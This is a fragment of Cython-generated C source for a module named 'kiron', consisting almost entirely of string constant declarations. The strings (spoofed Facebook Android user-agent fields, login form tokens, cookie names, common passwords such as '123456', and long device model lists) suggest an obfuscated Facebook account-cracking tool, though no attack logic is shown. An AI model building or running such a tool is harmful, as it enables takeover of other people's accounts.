static PyObject *__Pyx_Generator_Next(PyObject *self);
static int __pyx_Generator_init(PyObject *module);

/* CStringEquals.proto */
static CYTHON_INLINE int __Pyx_StrEq(const char *, const char *);

/* CheckBinaryVersion.proto */
static unsigned long __Pyx_get_runtime_version(void);
static int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);

/* #### Code section: module_declarations ### */

/* Module declarations from "kiron" */
/* #### Code section: typeinfo ### */
/* #### Code section: before_global_var ### */
#define __Pyx_MODULE_NAME "kiron"
extern int __pyx_module_is_main_kiron;
int __pyx_module_is_main_kiron = 0;

/* Implementation of "kiron" */
/* #### Code section: global_var ### */
static PyObject *__pyx_builtin_open;
static PyObject *__pyx_builtin_exit;
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_range;
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_ValueError;
/* #### Code section: string_decls ### */
static const char __pyx_k_0[] = ".0.";
static const char __pyx_k_1[] = "1";
static const char __pyx_k_2[] = "2";
static const char __pyx_k_3[] = "3";
static const char __pyx_k_4[] = "4";
static const char __pyx_k_5[] = "5";
static const char __pyx_k_6[] = "6";
static const char __pyx_k_7[] = "7";
static const char __pyx_k_8[] = "8";
static const char __pyx_k_9[] = "9";
static const char __pyx_k_A[] = "A";
static const char __pyx_k_B[] = "B";
static const char __pyx_k_C[] = "C";
static const char __pyx_k_D[] = "D";
static const char __pyx_k_G[] = "G";
static const char __pyx_k_M[] = "M";
static const char __pyx_k_R[] = "R";
static const char __pyx_k_S[] = "S";
static const char __pyx_k_X[] = "X";
static const char __pyx_k_Y[] = "Y";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_e[] = "e";
static const char __pyx_k_i[] = "i";
static const char __pyx_k_k[] = "k";
static const char __pyx_k_n[] = "n";
static const char __pyx_k_r[] = "r";
static const char __pyx_k_w[] = "w";
static const char __pyx_k_x[] = "x";
static const char __pyx_k_y[] = "y";
static const char __pyx_k_00[] = ".00";
static const char __pyx_k_01[] = "01";
static const char __pyx_k_02[] = "02";
static const char __pyx_k_03[] = "03";
static const char __pyx_k_04[] = "04";
static const char __pyx_k_05[] = "05";
static const char __pyx_k_06[] = "06";
static const char __pyx_k_07[] = "07";
static const char __pyx_k_08[] = "08";
static const char __pyx_k_09[] = "09";
static const char __pyx_k_10[] = "10";
static const char __pyx_k_11[] = "11";
static const char __pyx_k_12[] = "12";
static const char __pyx_k_25[] = ".25.";
static const char __pyx_k_28[] = "28";
static const char __pyx_k_29[] = "29";
static const char __pyx_k_59[] = ".59";
static const char __pyx_k_AM[] = "AM";
static const char __pyx_k_AP[] = "AP";
static const char __pyx_k_BD[] = "BD";
static const char __pyx_k_EX[] = "EX";
static const char __pyx_k_G1[] = "G1";
static const char __pyx_k_G2[] = "G2";
static const char __pyx_k_G3[] = "G3";
static const char __pyx_k_G4[] = "G4";
static const char __pyx_k_G5[] = "G5";
static const char __pyx_k_M1[] = "M1";
static const char __pyx_k_M3[] = "M3";
static const char __pyx_k_ND[] = "ND";
static const char __pyx_k_P2[] = "P2";
static const char __pyx_k_PM[] = "PM";
static const char __pyx_k_V3[] = "V3";
static const char __pyx_k_V5[] = "V5";
static const char __pyx_k_V7[] = "V7";
static const char __pyx_k_V9[] = "V9";
static const char __pyx_k_X1[] = "X1";
static const char __pyx_k_X2[] = "X2";
static const char __pyx_k_X3[] = "X3";
static const char __pyx_k_X4[] = "X4";
static const char __pyx_k_X5[] = "X5";
static const char __pyx_k_XD[] = "XD~[";
static const char __pyx_k_aV[] = "aV";
static const char __pyx_k_bV[] = "bV";
static const char __pyx_k_bx[] = "bx";
static const char __pyx_k_bz[] = "bz";
static const char __pyx_k_cV[] = "cV";
static const char __pyx_k_cx[] = "cx";
static const char __pyx_k_cz[] = "cz";
static const char __pyx_k_fn[] = "fn";
static const char __pyx_k_fo[] = "fo";
static const char __pyx_k_gc[] = "gc";
static const char __pyx_k_id[] = "id";
static const char __pyx_k_j1[] = "j1";
static const char __pyx_k_li[] = "li";
static const char __pyx_k_ln[] = "ln";
static const char __pyx_k_lt[] = "lt";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_po[] = "po";
static const char __pyx_k_ps[] = "ps";
static const char __pyx_k_pw[] = "pw";
static const char __pyx_k_rc[] = "rc";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_rp[] = "rp";
static const char __pyx_k_rr[] = "rr";
static const char __pyx_k_se[] = "se";
static const char __pyx_k_tl[] = "tl";
static const char __pyx_k_ua[] = "ua";
static const char __pyx_k_us[] = "us";
static const char __pyx_k_xd[] = "xd";
static const char __pyx_k_0_0[] = ".0.0.";
static const char __pyx_k_0_1[] = ".0.1; ";
static const char __pyx_k_0_2[] = "0";
static const char __pyx_k_0_3[] = "-0";
static const char __pyx_k_1_0[] = ".1.0.";
static const char __pyx_k_1_2[] = "?1";
static const char __pyx_k_210[] = "210";
static const char __pyx_k_980[] = "980";
static const char __pyx_k_GET[] = "GET";
static const char __pyx_k_JDQ[] = "JDQ";
static const char __pyx_k_M3s[] = "M3s";
static const char __pyx_k_MX2[] = "MX2";
static const char __pyx_k_MX5[] = "MX5";
static const char __pyx_k_May[] = "May";
static const char __pyx_k_Mi5[] = "Mi5";
static const char __pyx_k_OUT[] = "OUT";
static const char __pyx_k_V20[] = "V20";
static const char __pyx_k_V5s[] = "V5s";
static const char __pyx_k_Y21[] = "Y21";
static const char __pyx_k_Y28[] = "Y28";
static const char __pyx_k_Y51[] = "Y51";
static const char __pyx_k_Y65[] = "Y65";
static const char __pyx_k_Y66[] = "Y66";
static const char __pyx_k_Y69[] = "Y69";
static const char __pyx_k_Y71[] = "Y71";
static const char __pyx_k_Y81[] = "Y81";
static const char __pyx_k_Y83[] = "Y83";
static const char __pyx_k_Yes[] = "Yes";
static const char __pyx_k__11[] = ".";
static const char __pyx_k__25[] = " ";
static const char __pyx_k__32[] = "|";
static const char __pyx_k__33[] = "\n";
static const char __pyx_k__38[] = "/";
static const char __pyx_k__48[] = " (";
static const char __pyx_k__54[] = "; ";
static const char __pyx_k__63[] = "";
static const char __pyx_k__71[] = ";";
static const char __pyx_k__72[] = "=";
static const char __pyx_k__74[] = "+";
static const char __pyx_k__75[] = "_";
static const char __pyx_k__77[] = "-";
static const char __pyx_k__83[] = ";]";
static const char __pyx_k__84[] = "[\"";
static const char __pyx_k__85[] = "\"]";
static const char __pyx_k__88[] = " | ";
static const char __pyx_k__93[] = "*";
static const char __pyx_k_ask[] = "ask";
static const char __pyx_k_bln[] = "bln";
static const char __pyx_k_ckk[] = "ckk";
static const char __pyx_k_cph[] = "cph";
static const char __pyx_k_cpl[] = "cpl";
static const char __pyx_k_cps[] = "cps";
static const char __pyx_k_crk[] = "crk";
static const char __pyx_k_day[] = "day";
static const char __pyx_k_dic[] = "dic";
static const char __pyx_k_dpr[] = "dpr";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_ids[] = "ids";
static const char __pyx_k_key[] = "key";
static const char __pyx_k_li2[] = "li2";
static const char __pyx_k_lsd[] = "lsd";
static const char __pyx_k_ltx[] = "ltx";
static const char __pyx_k_mal[] = "mal";
static const char __pyx_k_mmm[] = "mmm";
static const char __pyx_k_mmp[] = "mmp";
static const char __pyx_k_moe[] = "moe";
static const char __pyx_k_now[] = "now";
static const char __pyx_k_oks[] = "oks";
static const char __pyx_k_old[] = "_old_";
static const char __pyx_k_pas[] = "pas";
static const char __pyx_k_pcp[] = "pcp";
static const char __pyx_k_pip[] = "pip";
static const char __pyx_k_res[] = "res";
static const char __pyx_k_rnd[] = "rnd";
static const char __pyx_k_ses[] = "ses";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_tag[] = "tag";
static const char __pyx_k_tgl[] = "tgl";
static const char __pyx_k_thn[] = "thn";
static const char __pyx_k_tks[] = "tks";
static const char __pyx_k_twf[] = "twf";
static const char __pyx_k_uid[] = "uid";
static const char __pyx_k_uno[] = "uno";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_yes[] = "yes";
static const char __pyx_k_Civi[] = "Civi";
static const char __pyx_k_FB4A[] = "FB4A";
static const char __pyx_k_FBAN[] = ") [FBAN/";
static const char __pyx_k_FBAV[] = ";FBAV/";
static const char __pyx_k_FBBD[] = ";FBBD/";
static const char __pyx_k_FBBV[] = ";FBBV/";
static const char __pyx_k_FBCR[] = ";FBCR/";
static const char __pyx_k_FBDV[] = ";FBDV/";
static const char __pyx_k_FBMF[] = ";FBMF/";
static const char __pyx_k_FBPN[] = ";FBPN/";
static const char __pyx_k_FBRV[] = ";FBRV/";
static const char __pyx_k_FBSV[] = ";FBSV/";
static const char __pyx_k_July[] = "July";
static const char __pyx_k_June[] = "June";
static const char __pyx_k_KOT4[] = "KOT4";
static const char __pyx_k_LMY4[] = "LMY4";
static const char __pyx_k_Last[] = "Last";
static const char __pyx_k_MI_2[] = "MI 2";
static const char __pyx_k_MI_5[] = "MI 5";
static const char __pyx_k_NMF2[] = "NMF2";
static const char __pyx_k_Name[] = "Name";
static const char __pyx_k_Pixi[] = "Pixi";
static const char __pyx_k_Pre3[] = "Pre3";
static const char __pyx_k_Ruby[] = "Ruby";
static const char __pyx_k_S580[] = "S580";
static const char __pyx_k_S616[] = "S616";
static const char __pyx_k_S660[] = "S660";
static const char __pyx_k_V808[] = "V808";
static const char __pyx_k_XD_2[] = "]~XD";
static const char __pyx_k_XD_3[] = "XD=";
static const char __pyx_k_Y21L[] = "Y21L";
static const char __pyx_k_Y51L[] = "Y51L";
static const char __pyx_k_Y55L[] = "Y55L";
static const char __pyx_k_Zong[] = "Zong";
static const char __pyx_k__119[] = ",";
static const char __pyx_k__124[] = ":";
static const char __pyx_k__160[] = "?";
static const char __pyx_k_adid[] = "adid";
static const char __pyx_k_api1[] = "api1";
static const char __pyx_k_api2[] = "api2";
static const char __pyx_k_args[] = "args";
static const char __pyx_k_bbbb[] = "bbbb";
static const char __pyx_k_code[] = "code";
static const char __pyx_k_coki[] = "coki";
static const char __pyx_k_data[] = "data";
static const char __pyx_k_date[] = "date";
static const char __pyx_k_dic2[] = "dic2";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_fban[] = "fban";
static const char __pyx_k_fbav[] = "fbav";
static const char __pyx_k_fbbd[] = "fbbd";
static const char __pyx_k_fbbv[] = "fbbv";
static const char __pyx_k_fbca[] = "fbca";
static const char __pyx_k_fbcr[] = "fbcr";
static const char __pyx_k_fbdm[] = "fbdm";
static const char __pyx_k_fbdv[] = "fbdv";
static const char __pyx_k_fbfw[] = "fbfw";
static const char __pyx_k_fblc[] = "fblc";
static const char __pyx_k_fbmf[] = "fbmf";
static const char __pyx_k_fbpn[] = "fbpn";
static const char __pyx_k_fbrv[] = "fbrv";
static const char __pyx_k_fbsv[] = "fbsv";
static const char __pyx_k_file[] = "file";
static const char __pyx_k_head[] = "head";
static const char __pyx_k_join[] = "join";
static const char __pyx_k_json[] = "json";
static const char __pyx_k_keys[] = "keys";
static const char __pyx_k_last[] = "last";
static const char __pyx_k_logo[] = "logo";
static const char __pyx_k_loop[] = "loop";
static const char __pyx_k_love[] = "love";
static const char __pyx_k_m_ts[] = "m_ts";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_math[] = "math";
static const char __pyx_k_menu[] = "menu";
static const char __pyx_k_mmmm[] = "mmmm";
static const char __pyx_k_mthd[] = "mthd";
static const char __pyx_k_name[] = "name";
static const char __pyx_k_none[] = "none";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_pass[] = "pass";
static const char __pyx_k_path[] = "path";
static const char __pyx_k_post[] = "post";
static const char __pyx_k_read[] = "read";
static const char __pyx_k_ress[] = "ress";
static const char __pyx_k_send[] = "send";
static const char __pyx_k_spec[] = "__spec__";
static const char __pyx_k_ssbb[] = "ssbb";
static const char __pyx_k_star[] = "star";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_text[] = "text";
static const char __pyx_k_tier[] = "tier";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_tred[] = "tred";
static const char __pyx_k_true[] = "true";
static const char __pyx_k_uidx[] = "uidx";
static const char __pyx_k_user[] = "user";
static const char __pyx_k_uuid[] = "uuid";
static const char __pyx_k_year[] = "year";
static const char __pyx_k_zlib[] = "zlib";
static const char __pyx_k_10000[] = "10000";
static const char __pyx_k_1_33m[] = "\033[1;33m";
static const char __pyx_k_1_34m[] = "\033[1;34m";
static const char __pyx_k_1_37m[] = "\033[1;37m";
static const char __pyx_k_1_96m[] = "\033[1;96m";
static const char __pyx_k_1_97m[] = "\033[1;97m";
static const char __pyx_k_4YYU8[] = "\303\2274YYU8\303\227";
static const char __pyx_k_April[] = "April";
static const char __pyx_k_Build[] = " Build/";
static const char __pyx_k_First[] = "First";
static const char __pyx_k_HRI83[] = "HRI83";
static const char __pyx_k_JDQ39[] = "JDQ39";
static const char __pyx_k_Liger[] = "Liger";
static const char __pyx_k_MB526[] = "MB526";
static const char __pyx_k_MI_3W[] = "MI 3W";
static const char __pyx_k_MI_4i[] = "MI 4i";
static const char __pyx_k_MI_5X[] = "MI 5X";
static const char __pyx_k_MX380[] = "MX380";
static const char __pyx_k_Magic[] = "Magic";
static const char __pyx_k_March[] = "March";
static const char __pyx_k_Mi_A1[] = "Mi A1";
static const char __pyx_k_Mi_XL[] = "Mi XL";
static const char __pyx_k_Monza[] = "Monza";
static const char __pyx_k_OAuth[] = "OAuth ";
static const char __pyx_k_P3400[] = "P3400";
static const char __pyx_k_Phone[] = "Phone";
static const char __pyx_k_Pixel[] = "Pixel";
static const char __pyx_k_Qin_2[] = "Qin 2";
static const char __pyx_k_Redmi[] = "; Redmi ";
static const char __pyx_k_Rhyme[] = "Rhyme";
static const char __pyx_k_Spark[] = "Spark";
static const char __pyx_k_V1Max[] = "V1Max";
static const char __pyx_k_Y5_II[] = "Y5 II";
static const char __pyx_k_build[] = "build";
static const char __pyx_k_clear[] = "clear";
static const char __pyx_k_close[] = "close";
static const char __pyx_k_email[] = "email";
static const char __pyx_k_en_GB[] = "en_GB";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_error[] = "error";
static const char __pyx_k_false[] = "false";
static const char __pyx_k_first[] = "first";
static const char __pyx_k_flush[] = "flush";
static const char __pyx_k_group[] = "group";
static const char __pyx_k_https[] = "https";
static const char __pyx_k_httpx[] = "httpx";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_items[] = "items";
static const char __pyx_k_kiron[] = "kiron";
static const char __pyx_k_light[] = "light";
static const char __pyx_k_limit[] = "limit";
static const char __pyx_k_linex[] = "linex";
static const char __pyx_k_login[] = "login";
static const char __pyx_k_lower[] = "lower";
static const char __pyx_k_mkdir[] = "mkdir";
static const char __pyx_k_mmmmm[] = "mmmmm";
static const char __pyx_k_model[] = "model";
static const char __pyx_k_month[] = "month";
static const char __pyx_k_names[] = "names";
static const char __pyx_k_plist[] = "plist";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_range[] = "range";
static const char __pyx_k_redmi[] = "redmi";
static const char __pyx_k_resrr[] = "resrr";
static const char __pyx_k_shell[] = "shell";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_throw[] = "throw";
static const char __pyx_k_total[] = "total";
static const char __pyx_k_utf_8[] = "utf-8";
static const char __pyx_k_uuid4[] = "uuid4";
static const char __pyx_k_value[] = "value";
static const char __pyx_k_width[] = ",width=";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_100000[] = "100000";
static const char __pyx_k_102030[] = "102030";
static const char __pyx_k_112233[] = "112233";
static const char __pyx_k_123123[] = "123123";
static const char __pyx_k_123456[] = "123456";
static const char __pyx_k_13_Pro[] = "13 Pro";
static const char __pyx_k_203040[] = "203040";
static const char __pyx_k_708090[] = "708090";
static const char __pyx_k_August[] = "August";
static const char __pyx_k_Chrome[] = "Chrome/";
static const char __pyx_k_Civi_2[] = "Civi 2";
static const char __pyx_k_EPE54B[] = "EPE54B";
static const char __pyx_k_HLK75C[] = "HLK75C";
static const char __pyx_k_HLK75F[] = "HLK75F";
static const char __pyx_k_HLK75H[] = "HLK75H";
static const char __pyx_k_Hongmi[] = "Hongmi";
static const char __pyx_k_IML74K[] = "IML74K";
static const char __pyx_k_IMM76D[] = "IMM76D";
static const char __pyx_k_JSS15J[] = "JSS15J";
static const char __pyx_k_JWR66L[] = "JWR66L";
static const char __pyx_k_JZO54K[] = "JZO54K";
static const char __pyx_k_KOT49H[] = "KOT49H";
static const char __pyx_k_KTU84P[] = "KTU84P";
static const char __pyx_k_LMY47V[] = "LMY47V";
static const char __pyx_k_LMY48G[] = "LMY48G";
static const char __pyx_k_LMY48J[] = "LMY48J";
static const char __pyx_k_LRX22C[] = "LRX22C";
static const char __pyx_k_LRX22G[] = "LRX22G";
static const char __pyx_k_Log_In[] = "Log In";
static const char __pyx_k_MDB08M[] = "MDB08M";
static const char __pyx_k_MMB29K[] = "MMB29K";
static const char __pyx_k_MMB29M[] = "MMB29M";
static const char __pyx_k_MMB29U[] = "MMB29U";
static const char __pyx_k_Mate_8[] = "Mate 8";
static const char __pyx_k_Mi_CC9[] = "Mi CC9";
static const char __pyx_k_Mi_Max[] = "Mi Max";
static const char __pyx_k_Mi_Mix[] = "Mi Mix";
static const char __pyx_k_Mi_One[] = "Mi One";
static const char __pyx_k_Mi_Pad[] = "Mi Pad";
static const char __pyx_k_Moto_C[] = "Moto C";
static const char __pyx_k_Moto_G[] = "Moto G";
static const char __pyx_k_Moto_X[] = "Moto X";
static const char __pyx_k_Moto_Z[] = "Moto Z";
static const char __pyx_k_N4F26J[] = "N4F26J";
static const char __pyx_k_N4F26X[] = "N4F26X";
static const char __pyx_k_N9F27L[] = "N9F27L";
static const char __pyx_k_NDE63H[] = "NDE63H";
static const char __pyx_k_NMF26X[] = "NMF26X";
static const char __pyx_k_NMF27D[] = "NMF27D";
static const char __pyx_k_NRD90M[] = "NRD90M";
static const char __pyx_k_NokiaX[] = "NokiaX";
static const char __pyx_k_P7_Max[] = "P7 Max";
static const char __pyx_k_Qin_1s[] = "Qin 1s+";
static const char __pyx_k_RM_560[] = "RM-560";
static const char __pyx_k_Random[] = "Random";
static const char __pyx_k_Realme[] = "Realme";
static const char __pyx_k_Rex_60[] = "Rex 60";
static const char __pyx_k_Rex_80[] = "Rex 80";
static const char __pyx_k_S4502M[] = "S4502M";
static const char __pyx_k_S4505M[] = "S4505M";
static const char __pyx_k_S4702M[] = "S4702M";
static const char __pyx_k_Safari[] = " Safari/";
static const char __pyx_k_Stream[] = "Stream";
static const char __pyx_k_VX5500[] = "VX5500";
static const char __pyx_k_Vdeo_2[] = "Vdeo 2";
static const char __pyx_k_Vibe_X[] = "Vibe X";
static const char __pyx_k_Vibe_Z[] = "Vibe Z";
static const char __pyx_k_Vision[] = "Vision";
static const char __pyx_k_YP_GI1[] = "YP-GI1";
static const char __pyx_k_accept[] = "accept";
static const char __pyx_k_append[] = "append";
static const char __pyx_k_base64[] = "base64";
static const char __pyx_k_c_user[] = "c_user";
static const char __pyx_k_choice[] = "choice";
static const char __pyx_k_chorom[] = "chorom";
static const char __pyx_k_decode[] = "decode";
static const char __pyx_k_device[] = "device";
static const char __pyx_k_digits[] = "digits";
static const char __pyx_k_enable[] = "enable";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_family[] = "family";
static const char __pyx_k_format[] = "format";
static const char __pyx_k_getuid[] = "getuid";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_kkkkki[] = "kkkkki";
static const char __pyx_k_locale[] = "locale";
static const char __pyx_k_method[] = "method";
static const char __pyx_k_mobile[] = "mobile";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_proxsi[] = "proxsi";
static const char __pyx_k_random[] = "random";
static const char __pyx_k_scheme[] = "scheme";
static const char __pyx_k_search[] = "search";
static const char __pyx_k_secure[] = "secure";
static const char __pyx_k_select[] = "select";
static const char __pyx_k_sexkey[] = "sexkey";
static const char __pyx_k_sim_id[] = "sim_id";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_stdout[] = "stdout";
static const char __pyx_k_string[] = "string";
static const char __pyx_k_submit[] = "submit";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_urllib[] = "urllib";
static const char __pyx_k_verify[] = "verify";
static const char __pyx_k_1234567[] = "1234567";
static const char __pyx_k_1_97m_2[] = "      \033[1;97m      \342\224\203\n
static const char __pyx_k_2_AYYUB[] = "\033]2; ~AYYUB~\007";
static const char __pyx_k_38_5_8m[] = "\033[38;5;8m";
static const char __pyx_k_Android[] = "\"Android\"";
static const char __pyx_k_CPH1801[] = "CPH1801";
static const char __pyx_k_CPH1803[] = "CPH1803";
static const char __pyx_k_CPH1805[] = "CPH1805";
static const char __pyx_k_CPH1809[] = "CPH1809";
static const char __pyx_k_CPH1827[] = "CPH1827";
static const char __pyx_k_CPH1837[] = "CPH1837";
static const char __pyx_k_CPH1851[] = "CPH1851";
static const char __pyx_k_CPH1853[] = "CPH1853";
static const char __pyx_k_CPH1979[] = "CPH1979";
static const char __pyx_k_CPH1983[] = "CPH1983";
static const char __pyx_k_CPH1987[] = "CPH1987";
static const char __pyx_k_CPH2005[] = "CPH2005";
static const char __pyx_k_CPH2009[] = "CPH2009";
static const char __pyx_k_CPH2015[] = "CPH2015";
static const char __pyx_k_CPH2059[] = "CPH2059";
static const char __pyx_k_CPH2061[] = "CPH2061";
static const char __pyx_k_CPH2065[] = "CPH2065";
static const char __pyx_k_CPH2069[] = "CPH2069";
static const char __pyx_k_CPH2071[] = "CPH2071";
static const char __pyx_k_CPH2073[] = "CPH2073";
static const char __pyx_k_CPH2077[] = "CPH2077";
static const char __pyx_k_CPH2091[] = "CPH2091";
static const char __pyx_k_CPH2095[] = "CPH2095";
static const char __pyx_k_CPH2099[] = "CPH2099";
static const char __pyx_k_CPH2137[] = "CPH2137";
static const char __pyx_k_CPH2139[] = "CPH2139";
static const char __pyx_k_CPH2145[] = "CPH2145";
static const char __pyx_k_CPH2161[] = "CPH2161";
static const char __pyx_k_CPH2185[] = "CPH2185";
static const char __pyx_k_CPH2201[] = "CPH2201";
static const char __pyx_k_CPH2209[] = "CPH2209";
static const char __pyx_k_January[] = "January";
static const char __pyx_k_M5_Lite[] = "M5 Lite";
static const char __pyx_k_M6_Note[] = "M6 Note";
static const char __pyx_k_MiTV_4A[] = "MiTV 4A";
static const char __pyx_k_MiTV_4C[] = "MiTV 4C";
static const char __pyx_k_MiTV_4I[] = "MiTV 4I";
static const char __pyx_k_MiTV_4S[] = "MiTV 4S";
static const char __pyx_k_MiTV_4X[] = "MiTV 4X";
static const char __pyx_k_MiTV_P1[] = "MiTV P1";
static const char __pyx_k_MiTV_Q1[] = "MiTV Q1";
static const char __pyx_k_Mi_CC_9[] = "Mi CC 9";
static const char __pyx_k_Mi_MAX2[] = "Mi MAX2";
static const char __pyx_k_Mi_Max3[] = "Mi Max3";
static const char __pyx_k_Mi_Pad4[] = "Mi Pad4";
static const char __pyx_k_Mi_Pad5[] = "Mi Pad5";
static const char __pyx_k_Mi_Play[] = "Mi Play";
static const char __pyx_k_Miracle[] = "Miracle";
static const char __pyx_k_Moto_E4[] = "Moto E4";
static const char __pyx_k_Moto_E5[] = "Moto E5";
static const char __pyx_k_Moto_G3[] = "Moto G3";
static const char __pyx_k_Moto_G4[] = "Moto G4";
static const char __pyx_k_Moto_G6[] = "Moto G6";
static const char __pyx_k_October[] = "October";
static const char __pyx_k_P55_Max[] = "P55 Max";
static const char __pyx_k_P8_Lite[] = "P8 Lite";
static const char __pyx_k_P9_Lite[] = "P9 Lite";
static const char __pyx_k_Pixel_3[] = "Pixel 3";
static const char __pyx_k_RMX2085[] = "RMX2085";
static const char __pyx_k_RMX2185[] = "RMX2185";
static const char __pyx_k_Redmi_2[] = "Redmi 2";
static const char __pyx_k_Redmi_3[] = "Redmi 3";
static const char __pyx_k_Redmi_4[] = "Redmi 4";
static const char __pyx_k_Redmi_5[] = "Redmi 5";
static const char __pyx_k_Redmi_6[] = "Redmi 6";
static const char __pyx_k_Redmi_7[] = "Redmi 7";
static const char __pyx_k_Redmi_8[] = "Redmi 8";
static const char __pyx_k_Redmi_9[] = "Redmi 9";
static const char __pyx_k_Redmi_X[] = "Redmi X";
static const char __pyx_k_SM_T111[] = "SM-T111";
static const char __pyx_k_SM_T230[] = "SM-T230";
static const char __pyx_k_SM_T231[] = "SM-T231";
static const char __pyx_k_SM_T235[] = "SM-T235";
static const char __pyx_k_SM_T310[] = "SM-T310";
static const char __pyx_k_SM_T311[] = "SM-T311";
static const char __pyx_k_SM_T315[] = "SM-T315";
static const char __pyx_k_SM_T525[] = "SM-T525";
static const char __pyx_k_SM_T531[] = "SM-T531";
static const char __pyx_k_SM_T535[] = "SM-T535";
static const char __pyx_k_SM_T555[] = "SM-T555";
static const char __pyx_k_SM_T561[] = "SM-T561";
static const char __pyx_k_SM_T705[] = "SM-T705";
static const char __pyx_k_SM_T805[] = "SM-T805";
static const char __pyx_k_SM_T820[] = "SM-T820";
static const char __pyx_k_Session[] = "Session";
static const char __pyx_k_TM_4377[] = "TM-4377";
static const char __pyx_k_V7_Plus[] = "V7 Plus";
static const char __pyx_k_Vibe_K5[] = "Vibe K5";
static const char __pyx_k_Y3_2018[] = "Y3 (2018)";
static const char __pyx_k_Y6_2018[] = "Y6 (2018)";
static const char __pyx_k_choices[] = "choices";
static const char __pyx_k_cookies[] = "cookies";
static const char __pyx_k_cudiua1[] = "cudiua1";
static const char __pyx_k_cudiua2[] = "cudiua2";
static const char __pyx_k_cudiua3[] = "cudiua3";
static const char __pyx_k_cudiua4[] = "cudiua4";
static const char __pyx_k_cudiua5[] = "cudiua5";
static const char __pyx_k_cudiua6[] = "cudiua6";
static const char __pyx_k_cudiua7[] = "cudiua7";
static const char __pyx_k_cudiua8[] = "cudiua8";
static const char __pyx_k_disable[] = "disable";
static const char __pyx_k_findall[] = "findall";
static const char __pyx_k_free_fb[] = "free_fb";
static const char __pyx_k_genexpr[] = "genexpr";
static const char __pyx_k_hash_id[] = "hash_id";
static const char __pyx_k_hashlib[] = "hashlib";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_jazoest[] = "jazoest";
static const char __pyx_k_message[] = "message";
static const char __pyx_k_mod_txt[] = ".mod.txt";
static const char __pyx_k_randint[] = "randint";
static const char __pyx_k_regular[] = "regular";
static const char __pyx_k_replace[] = "replace";
static const char __pyx_k_session[] = "session";
static const char __pyx_k_smtplib[] = "smtplib";
static const char __pyx_k_tokenku[] = "tokenku";
static const char __pyx_k_try_num[] = "try_num";
static const char __pyx_k_unknown[] = "unknown";
static const char __pyx_k_urandom[] = "urandom";
static const char __pyx_k_urllib3[] = "urllib3";
static const char __pyx_k_urlopen[] = "urlopen";
static const char __pyx_k_windows[] = "windows";
static const char __pyx_k_12345678[] = "12345678";
static const char __pyx_k_38_5_14m[] = "\033[38;5;14m";
static const char __pyx_k_38_5_46m[] = "\033[38;5;46m";
static const char __pyx_k_38_5_47m[] = "\033[38;5;47m";
static const char __pyx_k_38_5_48m[] = "\033[38;5;48m";
static const char __pyx_k_38_5_49m[] = "\033[38;5;49m";
static const char __pyx_k_38_5_50m[] = "\033[38;5;50m";
static const char __pyx_k_38_5_86m[] = "\033[38;5;86m";
static const char __pyx_k_AYYUB_M1[] = "AYYUB_M1";
static const char __pyx_k_AYYUB_M2[] = "AYYUB_M2";
static const char __pyx_k_December[] = "December";
static const char __pyx_k_Devember[] = "Devember";
static const char __pyx_k_February[] = "February";
static const char __pyx_k_GT_I9190[] = "GT-I9190";
static const char __pyx_k_GT_I9192[] = "GT-I9192";
static const char __pyx_k_GT_I9300[] = "GT-I9300";
static const char __pyx_k_GT_I9500[] = "GT-I9500";
static const char __pyx_k_GT_N5100[] = "GT-N5100";
static const char __pyx_k_GT_N7100[] = "GT-N7100";
static const char __pyx_k_GT_N8000[] = "GT-N8000";
static const char __pyx_k_GT_P3110[] = "GT-P3110";
static const char __pyx_k_GT_P5100[] = "GT-P5100";
static const char __pyx_k_GT_P5110[] = "GT-P5110";
static const char __pyx_k_GT_P5200[] = "GT-P5200";
static const char __pyx_k_GT_P5210[] = "GT-P5210";
static const char __pyx_k_GT_P5220[] = "GT-P5220";
static const char __pyx_k_GT_S7390[] = "GT-S7390";
static const char __pyx_k_Hongmi_2[] = "Hongmi 2";
static const char __pyx_k_LRX22G_2[] = "LRX22G;";
static const char __pyx_k_M_Bot_54[] = "M Bot 54";
static const char __pyx_k_M_Bot_60[] = "M Bot 60";
static const char __pyx_k_Medias_X[] = "Medias X";
static const char __pyx_k_Mi_4_LTE[] = "Mi 4 LTE";
static const char __pyx_k_Mi_Box_4[] = "Mi Box 4";
static const char __pyx_k_Mi_CC_9e[] = "Mi CC 9e";
static const char __pyx_k_Mi_Max_2[] = "Mi Max 2";
static const char __pyx_k_Mi_Max_3[] = "Mi Max 3";
static const char __pyx_k_Mi_Mix_2[] = "Mi Mix 2";
static const char __pyx_k_Mi_Mix_3[] = "Mi Mix 3";
static const char __pyx_k_Mi_Mix_4[] = "Mi Mix 4";
static const char __pyx_k_Mi_Note5[] = "Mi Note5";
static const char __pyx_k_Mi_Pad_2[] = "Mi Pad 2";
static const char __pyx_k_Mi_Pad_3[] = "Mi Pad 3";
static const char __pyx_k_Mi_Pad_4[] = "Mi Pad 4";
static const char __pyx_k_Mi_Pad_5[] = "Mi Pad 5";
static const char __pyx_k_Moto_G5s[] = "Moto G5s";
static const char __pyx_k_NMF26X_2[] = "NMF26X;";
static const char __pyx_k_NRD90M_2[] = "NRD90M;";
